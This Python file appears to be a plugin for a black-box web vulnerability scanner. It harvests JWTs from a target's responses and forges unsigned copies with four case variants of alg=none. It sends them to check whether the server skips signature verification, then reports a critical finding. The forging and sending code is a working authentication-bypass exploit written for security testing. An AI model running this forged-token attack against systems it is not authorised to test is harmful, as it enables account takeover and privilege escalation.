# vibee_hacker/plugins/blackbox/jwt_none_attack.py
"""JWT None Algorithm attack plugin — forge tokens with alg=none."""

from __future__ import annotations

import base64
import json
import re

import httpx

from vibee_hacker.core.models import Target, Result, Severity, InterPhaseContext
from vibee_hacker.core.plugin_base import PluginBase

JWT_PATTERN = re.compile(r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*")

# Variations of "none" accepted by some libraries
NONE_VARIANTS = ["none", "None", "NONE", "nOnE"]


def _b64_decode(segment: str) -> dict | None:
    padding = 4 - len(segment) % 4
    if padding != 4:
        segment += "=" * padding
    try:
        return json.loads(base64.urlsafe_b64decode(segment))
    except Exception:
        return None


def _b64_encode(data: dict) -> str:
    encoded = base64.urlsafe_b64encode(json.dumps(data, separators=(",", ":")).encode()).decode()
    return encoded.rstrip("=")


def _forge_none_token(original_token: str, alg_variant: str = "none") -> str:
    """Return a JWT with alg replaced by the given none-variant and no signature."""
    parts = original_token.split(".")
    if len(parts) != 3:
        return original_token
    header = _b64_decode(parts[0])
    if header is None:
        return original_token
    header["alg"] = alg_variant
    new_header = _b64_encode(header)
    # Keep original payload, empty signature
    return f"{new_header}.{parts[1]}."


def _extract_jwts(text: str, headers) -> list[str]:
    tokens: list[str] = []
    try:
        all_header_pairs = headers.multi_items()
    except AttributeError:
        all_header_pairs = list(headers.items())
    for header_name, value in all_header_pairs:
        if header_name.lower() in ("authorization", "set-cookie"):
            for match in JWT_PATTERN.finditer(value):
                tokens.append(match.group())
    for match in JWT_PATTERN.finditer(text):
        tokens.append(match.group())
    return list(dict.fromkeys(tokens))


class JwtNoneAttackPlugin(PluginBase):
    name = "jwt_none_attack"
    description = "Forge JWT with alg=none to test if server accepts unsigned tokens"
    category = "blackbox"
    phase = 3
    base_severity = Severity.CRITICAL
    destructive_level = 1
    detection_criteria = (
        "Server returns 200 with non-error body when presented a JWT forged with alg=none"
    )
    expected_evidence = "Server accepted forged JWT with empty signature"

    async def run(self, target: Target, context: InterPhaseContext | None = None) -> list[Result]:
        if not target.url:
            return []

        async with httpx.AsyncClient(verify=target.verify_ssl, timeout=10) as client:
            # Step 1: get a real JWT from the endpoint
            try:
                initial_resp = await client.get(target.url)
            except (httpx.TransportError, httpx.InvalidURL, httpx.DecodingError):
                return []

            if len(initial_resp.text) > 1_000_000:
                return []

            tokens = _extract_jwts(initial_resp.text, initial_resp.headers)
            if not tokens:
                return []

            results: list[Result] = []

            for token in tokens:
                parts = token.split(".")
                if len(parts) != 3:
                    continue
                header_data = _b64_decode(parts[0])
                if header_data is None:
                    continue
                current_alg = str(header_data.get("alg", "")).lower()
                if current_alg == "none":
                    # Already using none — passive detection by jwt_check
                    continue

                for variant in NONE_VARIANTS:
                    forged = _forge_none_token(token, variant)
                    try:
                        resp = await client.get(
                            target.url,
                            headers={"Authorization": f"Bearer {forged}"},
                        )
                    except (httpx.TransportError, httpx.InvalidURL, httpx.DecodingError):
                        continue

                    if len(resp.text) > 1_000_000:
                        continue

                    # Heuristic: 200 and not an error body indicates acceptance
                    error_keywords = ["invalid", "unauthorized", "forbidden", "expired", "signature"]
                    body_lower = resp.text.lower()
                    has_error = any(kw in body_lower for kw in error_keywords)

                    if resp.status_code == 200 and not has_error:
                        results.append(Result(
                            plugin_name=self.name,
                            base_severity=self.base_severity,
                            title="JWT None Algorithm Attack — server accepted forged token",
                            description=(
                                f"The server accepted a JWT token with alg='{variant}' and an empty "
                                f"signature (none algorithm attack). This means the server does not "
                                f"verify the JWT signature, allowing an attacker to forge arbitrary "
                                f"claims including elevated privileges."
                            ),
                            evidence=(
                                f"Forged JWT (alg='{variant}', empty sig) accepted | "
                                f"Status: {resp.status_code} | Original alg: {current_alg}"
                            ),
                            cwe_id="CWE-345",
                            endpoint=target.url,
                            curl_command=(
                                f"curl {target.url!r} "
                                f"-H 'Authorization: Bearer {forged[:40]}...'"
                            ),
                            rule_id="jwt_none_algorithm",
                        ))
                        return results  # One finding is enough

        return results
